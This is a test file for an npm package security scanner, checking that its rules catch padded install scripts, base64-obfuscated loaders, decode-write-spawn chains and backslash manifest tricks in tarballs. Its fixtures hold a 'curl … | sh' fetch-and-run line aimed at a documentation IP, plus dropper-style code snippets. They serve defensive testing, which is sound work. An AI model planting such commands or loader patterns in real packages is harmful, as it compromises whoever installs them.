import assert from "node:assert/strict";
import { describe, test } from "node:test";
import { gzipSync } from "node:zlib";
import { auditTarball, extractTarball, runRules } from "../src/index.js";
import { analyzeLoaderChain } from "../src/detect/loader-chain.js";
import type { AuditInput, PackageFile } from "../src/types.js";

// Post-review follow-ups for Group 2: no token-cap bypass, base64 spelling
// variants, indexed written-path lookup, backslash tar paths.

const BUDGET_MS = 1000;
const CURL_SH = "curl -s http://198.51.100.1/x | sh"; // RFC 5737 documentation address

function file(path: string, content: string): PackageFile {
  return { path, content, size: Buffer.byteLength(content), changed: false };
}
function inputFor(files: Record<string, string>, pkgJson?: unknown): AuditInput {
  const list = Object.entries(files).map(([p, c]) => file(p, c));
  if (pkgJson !== undefined) list.push(file("package/package.json", JSON.stringify(pkgJson)));
  return {
    meta: {
      name: "probe", version: "1.0.0", author: null, maintainers: [], license: null,
      hasInstallScripts: false, signature: "unknown", provenance: "unknown", integrity: null,
      unpackedSize: 0, fileCount: list.length,
    },
    files: list,
    mode: "full",
  };
}
function assertFast(label: string, fn: () => unknown): void {
  const t = performance.now();
  fn();
  const ms = performance.now() - t;
  console.log(`[timing] ${label}: ${ms.toFixed(0)} ms`);
  assert.ok(ms < BUDGET_MS, `${label} took ${ms.toFixed(0)} ms (budget ${BUDGET_MS} ms)`);
}

describe("install-scripts: no token cap to pad past", () => {
  const critical = (f: ReturnType<typeof runRules>) =>
    f.filter((x) => x.ruleId === "install-scripts" && x.severity === "critical").length;

  test("100 junk tokens before `node setup` still inspect `setup`", () => {
    const pad = Array.from({ length: 100 }, (_, i) => `junk${i}`).join(" ");
    const f = runRules(inputFor({ "package/setup": `${CURL_SH}\n` }, { scripts: { postinstall: `echo ${pad} && node setup` } }));
    assert.equal(critical(f), 1);
  });

  test("a very long junk token before the script name does not hide it", () => {
    const f = runRules(inputFor({ "package/setup": `${CURL_SH}\n` }, { scripts: { postinstall: `echo ${"j".repeat(5000)} && node setup` } }));
    assert.equal(critical(f), 1);
  });

  test("tokens split on `$`, `{`, `}` and backslash", () => {
    for (const cmd of ["node ${npm_config_x}setup", "node $setup", "node {setup}", "node \\setup"]) {
      const f = runRules(inputFor({ "package/setup": `${CURL_SH}\n` }, { scripts: { postinstall: cmd } }));
      assert.equal(critical(f), 1, cmd);
    }
  });

  test("JS suffix fallback still resolves `scripts/x.js` to a nested file", () => {
    const f = runRules(inputFor({ "package/lib/scripts/x.js": `${CURL_SH}\n` }, { scripts: { postinstall: "node scripts/x.js" } }));
    assert.equal(critical(f), 1);
  });

  test("a 2 MiB command finishes fast and still resolves the trailing script", () => {
    const cmd = "a ".repeat(1024 * 1024) + "node setup";
    const input = inputFor({ "package/setup": `${CURL_SH}\n` }, { scripts: { postinstall: cmd } });
    let out: ReturnType<typeof runRules> = [];
    assertFast("install-scripts 2 MiB command", () => { out = runRules(input); });
    assert.equal(critical(out), 1);
  });
});

describe("base64 marker spellings", () => {
  const spellings = ["base64", "BASE64", "Base64", "base64url", "BASE64URL"];
  const b64 = "A".repeat(300);

  test("obfuscation: Function constructor over Buffer.from in every spelling", () => {
    for (const enc of spellings) {
      for (const src of [
        `new Function(Buffer.from("${b64}", "${enc}").toString())();`,
        `var s = Buffer.from("${b64}", '${enc}'); new Function(s)();`,
      ]) {
        const f = runRules(inputFor({ "package/index.js": src })).filter((x) => x.ruleId === "obfuscation");
        assert.ok(f.some((x) => /Function constructor/.test(x.message)), `missed ${enc}: ${src.slice(0, 30)}`);
      }
    }
  });

  test("native-payload-loader: regex fallback sees every spelling", () => {
    for (const enc of spellings) {
      const src = `}{ const d = Buffer.from("${b64}", "${enc}"); require("fs").writeFileSync("/tmp/x", d);`;
      const f = runRules(inputFor({ "package/index.js": src }, { name: "p" })).filter((x) => x.ruleId === "native-payload-loader");
      assert.equal(f.length, 1, enc);
    }
  });

  test("loader-chain: Buffer.from(x, <spelling>) is a decode step in the dataflow chain", () => {
    for (const enc of spellings) {
      const src = `
const fs=require('fs'),cp=require('child_process'),os=require('os'),path=require('path');
const c=fs.readFileSync(path.join(__dirname,'intro.js'));
const b=Buffer.from(c.toString(),'${enc}');
const out=path.join(os.tmpdir(),'.x');
fs.writeFileSync(out,b); cp.spawn(out,[],{detached:true});`;
      assert.equal(analyzeLoaderChain(src).correlated, true, enc);
    }
  });
});

describe("loader-chain: written paths are indexed", () => {
  const HEAD = "const fs=require('fs'),zlib=require('zlib'),cp=require('child_process'),os=require('os'),path=require('path');\n"
    + "(function(){const d=zlib.gunzipSync(fs.readFileSync(path.join(__dirname,'p')));\n";

  test("1 MiB of writes and launches stays fast", () => {
    let body = "";
    for (let i = 0; HEAD.length + body.length < 1024 * 1024; i++) body += `fs.writeFileSync('o${i}',d);cp.spawn('o${i}x');\n`;
    const input = inputFor({ "package/index.js": HEAD + body + "})();" }, { name: "p" });
    assertFast("loader-chain 1 MiB writtenPaths", () => runRules(input));
  });

  test("an inline structurally-equal write path and launch target still correlate", () => {
    const src = `${HEAD}fs.writeFileSync(path.join(os.tmpdir(),'x'),d); cp.spawn(path.join(os.tmpdir(),'x'));})();`;
    assert.equal(analyzeLoaderChain(src).correlated, true);
  });

  test("a different launch target does not correlate", () => {
    const src = `${HEAD}fs.writeFileSync(path.join(os.tmpdir(),'x'),d); cp.spawn(path.join(os.tmpdir(),'y'));})();`;
    assert.equal(analyzeLoaderChain(src).correlated, false);
  });

  test("a write in a sibling scope is not visible to a launch elsewhere", () => {
    const src = `${HEAD}})();
(function(){ cp.spawn(path.join(os.tmpdir(),'x')); })();
(function(){ const d2=zlib.gunzipSync(fs.readFileSync(path.join(__dirname,'p'))); fs.writeFileSync(path.join(os.tmpdir(),'x'),d2); })();`;
    assert.equal(analyzeLoaderChain(src).correlated, false);
  });
});

// Hand-rolled tar so the entry name is controlled byte for byte.
function tarBytes(entries: { name: string; data: string }[]): Buffer {
  const blocks: Buffer[] = [];
  for (const e of entries) {
    const data = Buffer.from(e.data);
    const h = Buffer.alloc(512);
    h.write(e.name, 0, 100, "utf8");
    h.write("0000644\0", 100);
    h.write("0000000\0", 108);
    h.write("0000000\0", 116);
    h.write(data.length.toString(8).padStart(11, "0") + "\0", 124);
    h.write("00000000000\0", 136);
    h.write("        ", 148);
    h.write("0", 156);
    h.write("ustar\0" + "00", 257);
    let sum = 0;
    for (const b of h) sum += b;
    h.write(sum.toString(8).padStart(6, "0") + "\0 ", 148);
    blocks.push(h, data, Buffer.alloc((512 - (data.length % 512)) % 512));
  }
  blocks.push(Buffer.alloc(1024));
  return gzipSync(Buffer.concat(blocks));
}

describe("extract: backslash entry paths", () => {
  const BENIGN = JSON.stringify({ name: "demo", version: "1.0.0" });
  const EVIL = JSON.stringify({ name: "demo", version: "1.0.0", scripts: { postinstall: CURL_SH } });
  const meta = { name: "demo", version: "1.0.0", author: null, maintainers: [] as string[], license: null, hasInstallScripts: false };

  // Round-1 review: POSIX node-tar keeps `\` as a filename character, so the retained path
  // follows that reading; the Windows reading still counts toward the root manifest.
  test("`package\\package.json` is counted as a root manifest (Windows reading) but not retained as one (POSIX reading)", async () => {
    const r = await extractTarball(tarBytes([{ name: "package\\package.json", data: EVIL }]));
    assert.deepEqual(r.files.map((f) => f.path), []);
    assert.equal(r.packageManifestEntryCount, 1);
    assert.ok(r.manifestConfusion.length > 0);
  });

  test("a backslash duplicate of the manifest triggers manifest-confusion", async () => {
    const report = await auditTarball({
      meta,
      tarball: tarBytes([{ name: "package/package.json", data: BENIGN }, { name: "package\\package.json", data: EVIL }]),
    });
    const f = report.findings.find((x) => x.ruleId === "manifest-confusion");
    assert.ok(f, "manifest-confusion expected");
    assert.equal(report.verdict, "block");
  });
});
